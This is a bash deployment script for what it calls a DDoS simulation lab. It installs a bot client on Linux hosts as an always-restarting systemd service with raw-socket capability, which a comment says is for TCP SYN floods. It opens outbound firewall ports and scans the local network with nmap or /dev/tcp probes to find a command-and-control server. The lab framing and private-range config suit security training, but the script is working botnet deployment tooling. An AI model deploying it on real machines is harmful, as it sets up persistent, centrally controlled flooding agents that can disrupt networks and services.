#!/bin/bash

# DDoS Simulation Lab - Bot Deployment Script for Linux
# This script deploys the bot client to Linux machines

set -e  # Exit on any error

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
BOT_USER="ddos-bot"
BOT_HOME="/opt/ddos-lab"
SERVICE_NAME="ddos-bot"
LOG_DIR="/var/log/ddos-lab"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root (for raw socket support)"
        exit 1
    fi
}

# Detect Linux distribution
detect_distro() {
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        DISTRO=$ID
        VERSION=$VERSION_ID
    else
        log_error "Cannot detect Linux distribution"
        exit 1
    fi
    
    log_info "Detected distribution: $DISTRO $VERSION"
}

# Install system dependencies
install_dependencies() {
    log_info "Installing system dependencies..."
    
    case $DISTRO in
        ubuntu|debian)
            apt-get update
            apt-get install -y python3 python3-pip python3-venv git curl wget
            ;;
        centos|rhel|fedora)
            if command -v dnf &> /dev/null; then
                dnf install -y python3 python3-pip python3-venv git curl wget
            else
                yum install -y python3 python3-pip python3-venv git curl wget
            fi
            ;;
        arch)
            pacman -Sy --noconfirm python python-pip python-virtualenv git curl wget
            ;;
        *)
            log_warning "Unknown distribution, attempting generic installation..."
            # Try to install with common package managers
            if command -v apt-get &> /dev/null; then
                apt-get update && apt-get install -y python3 python3-pip python3-venv git curl wget
            elif command -v yum &> /dev/null; then
                yum install -y python3 python3-pip python3-venv git curl wget
            elif command -v pacman &> /dev/null; then
                pacman -Sy --noconfirm python python-pip python-virtualenv git curl wget
            else
                log_error "Cannot install dependencies - unknown package manager"
                exit 1
            fi
            ;;
    esac
    
    log_success "System dependencies installed"
}

# Create bot user and directories
setup_user_and_dirs() {
    log_info "Setting up bot user and directories..."
    
    # Create bot user if it doesn't exist
    if ! id "$BOT_USER" &>/dev/null; then
        useradd -r -s /bin/false -d "$BOT_HOME" "$BOT_USER"
        log_success "Created bot user: $BOT_USER"
    else
        log_info "Bot user already exists: $BOT_USER"
    fi
    
    # Create directories
    mkdir -p "$BOT_HOME"
    mkdir -p "$LOG_DIR"
    
    # Set permissions
    chown -R "$BOT_USER:$BOT_USER" "$BOT_HOME"
    chown -R "$BOT_USER:$BOT_USER" "$LOG_DIR"
    
    log_success "Directories created and configured"
}

# Copy project files
copy_project_files() {
    log_info "Copying project files..."
    
    # Copy source code
    cp -r "$PROJECT_ROOT/bot_client" "$BOT_HOME/"
    cp -r "$PROJECT_ROOT/shared" "$BOT_HOME/"
    cp "$PROJECT_ROOT/requirements.txt" "$BOT_HOME/"
    cp "$PROJECT_ROOT/config.json" "$BOT_HOME/"
    
    # Create Python virtual environment
    python3 -m venv "$BOT_HOME/venv"
    
    # Install Python dependencies
    "$BOT_HOME/venv/bin/pip" install --upgrade pip
    "$BOT_HOME/venv/bin/pip" install -r "$BOT_HOME/requirements.txt"
    
    # Set permissions
    chown -R "$BOT_USER:$BOT_USER" "$BOT_HOME"
    
    log_success "Project files copied and dependencies installed"
}

# Configure bot client
configure_bot() {
    log_info "Configuring bot client..."
    
    # Get local IP address
    LOCAL_IP=$(ip route get 8.8.8.8 | awk '{print $7; exit}')
    HOSTNAME=$(hostname)
    
    # Generate bot ID
    BOT_ID="bot-${HOSTNAME}-$(date +%s)"
    
    # Create bot-specific config
    cat > "$BOT_HOME/bot_config.json" << EOF
{
  "bot_client": {
    "bot_id": "$BOT_ID",
    "hostname": "$HOSTNAME",
    "c2_server_host": null,
    "c2_server_port": 8081,
    "reconnect_interval": 5,
    "max_reconnect_attempts": 10,
    "heartbeat_interval": 10,
    "log_level": "INFO",
    "log_file": "$LOG_DIR/bot_client.log"
  },
  "network": {
    "lab_network_cidr": "192.168.0.0/16",
    "allowed_networks": [
      "192.168.0.0/16",
      "10.0.0.0/8",
      "172.16.0.0/12"
    ]
  }
}
EOF
    
    chown "$BOT_USER:$BOT_USER" "$BOT_HOME/bot_config.json"
    
    log_success "Bot client configured with ID: $BOT_ID"
}

# Create systemd service
create_service() {
    log_info "Creating systemd service..."
    
    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=DDoS Simulation Lab Bot Client
After=network.target
Wants=network.target

[Service]
Type=simple
User=$BOT_USER
Group=$BOT_USER
WorkingDirectory=$BOT_HOME
Environment=PYTHONPATH=$BOT_HOME
ExecStart=$BOT_HOME/venv/bin/python -m bot_client.main
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=$SERVICE_NAME

# Security settings
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$LOG_DIR $BOT_HOME

# Allow raw socket creation (needed for TCP SYN flood)
AmbientCapabilities=CAP_NET_RAW
CapabilityBoundingSet=CAP_NET_RAW

[Install]
WantedBy=multi-user.target
EOF
    
    # Reload systemd and enable service
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    
    log_success "Systemd service created and enabled"
}

# Configure firewall (if needed)
configure_firewall() {
    log_info "Configuring firewall..."
    
    # Check if firewall is active
    if systemctl is-active --quiet ufw; then
        log_info "UFW firewall detected, configuring rules..."
        # Allow outbound connections to C2 server
        ufw allow out 8081/tcp comment "DDoS Lab C2 Connection"
        log_success "UFW firewall configured"
    elif systemctl is-active --quiet firewalld; then
        log_info "Firewalld detected, configuring rules..."
        # Allow outbound connections to C2 server
        firewall-cmd --permanent --add-port=8081/tcp
        firewall-cmd --reload
        log_success "Firewalld configured"
    else
        log_info "No active firewall detected, skipping configuration"
    fi
}

# Network discovery for C2 server
discover_c2_server() {
    log_info "Attempting to discover C2 server..."
    
    # Get network range
    NETWORK=$(ip route | grep -E "192\.168\.|10\.|172\." | head -1 | awk '{print $1}')
    
    if [[ -n "$NETWORK" ]]; then
        log_info "Scanning network $NETWORK for C2 server on port 8081..."
        
        # Use nmap if available, otherwise use basic scanning
        if command -v nmap &> /dev/null; then
            C2_SERVER=$(nmap -p 8081 --open "$NETWORK" 2>/dev/null | grep -B 4 "8081/tcp open" | grep "Nmap scan report" | head -1 | awk '{print $5}')
        else
            # Basic port scanning with netcat or telnet
            log_info "Nmap not available, using basic scanning..."
            for ip in $(seq 1 254); do
                test_ip="${NETWORK%.*}.$ip"
                if timeout 1 bash -c "echo >/dev/tcp/$test_ip/8081" 2>/dev/null; then
                    C2_SERVER="$test_ip"
                    break
                fi
            done
        fi
        
        if [[ -n "$C2_SERVER" ]]; then
            log_success "Found C2 server at: $C2_SERVER"
            
            # Update configuration with discovered C2 server
            sed -i "s/\"c2_server_host\": null/\"c2_server_host\": \"$C2_SERVER\"/" "$BOT_HOME/bot_config.json"
        else
            log_warning "C2 server not found, bot will attempt auto-discovery on startup"
        fi
    else
        log_warning "Could not determine network range for C2 discovery"
    fi
}

# Start the bot service
start_service() {
    log_info "Starting bot service..."
    
    systemctl start "$SERVICE_NAME"
    
    # Check if service started successfully
    sleep 2
    if systemctl is-active --quiet "$SERVICE_NAME"; then
        log_success "Bot service started successfully"
        
        # Show service status
        systemctl status "$SERVICE_NAME" --no-pager -l
    else
        log_error "Failed to start bot service"
        log_error "Check logs with: journalctl -u $SERVICE_NAME -f"
        exit 1
    fi
}

# Show deployment summary
show_summary() {
    echo
    log_success "=== Deployment Summary ==="
    echo "Bot ID: $(grep -o '"bot_id": "[^"]*' "$BOT_HOME/bot_config.json" | cut -d'"' -f4)"
    echo "Bot Home: $BOT_HOME"
    echo "Log Directory: $LOG_DIR"
    echo "Service Name: $SERVICE_NAME"
    echo "Local IP: $(ip route get 8.8.8.8 | awk '{print $7; exit}')"
    
    if [[ -n "$C2_SERVER" ]]; then
        echo "C2 Server: $C2_SERVER:8081"
    else
        echo "C2 Server: Auto-discovery enabled"
    fi
    
    echo
    echo "Useful commands:"
    echo "  Start service:   systemctl start $SERVICE_NAME"
    echo "  Stop service:    systemctl stop $SERVICE_NAME"
    echo "  Service status:  systemctl status $SERVICE_NAME"
    echo "  View logs:       journalctl -u $SERVICE_NAME -f"
    echo "  Bot logs:        tail -f $LOG_DIR/bot_client.log"
    echo
}

# Main deployment function
main() {
    log_info "Starting DDoS Simulation Lab Bot Deployment"
    echo "=========================================="
    
    check_root
    detect_distro
    install_dependencies
    setup_user_and_dirs
    copy_project_files
    configure_bot
    create_service
    configure_firewall
    discover_c2_server
    start_service
    show_summary
    
    log_success "Bot deployment completed successfully!"
}

# Handle command line arguments
case "${1:-}" in
    --help|-h)
        echo "DDoS Simulation Lab Bot Deployment Script"
        echo
        echo "Usage: $0 [OPTIONS]"
        echo
        echo "Options:"
        echo "  --help, -h     Show this help message"
        echo "  --uninstall    Uninstall the bot client"
        echo "  --status       Show bot status"
        echo "  --logs         Show bot logs"
        echo
        exit 0
        ;;
    --uninstall)
        log_info "Uninstalling bot client..."
        systemctl stop "$SERVICE_NAME" 2>/dev/null || true
        systemctl disable "$SERVICE_NAME" 2>/dev/null || true
        rm -f "/etc/systemd/system/$SERVICE_NAME.service"
        systemctl daemon-reload
        userdel "$BOT_USER" 2>/dev/null || true
        rm -rf "$BOT_HOME"
        rm -rf "$LOG_DIR"
        log_success "Bot client uninstalled"
        exit 0
        ;;
    --status)
        systemctl status "$SERVICE_NAME" --no-pager -l
        exit 0
        ;;
    --logs)
        journalctl -u "$SERVICE_NAME" -f
        exit 0
        ;;
    "")
        main
        ;;
    *)
        log_error "Unknown option: $1"
        echo "Use --help for usage information"
        exit 1
        ;;
esac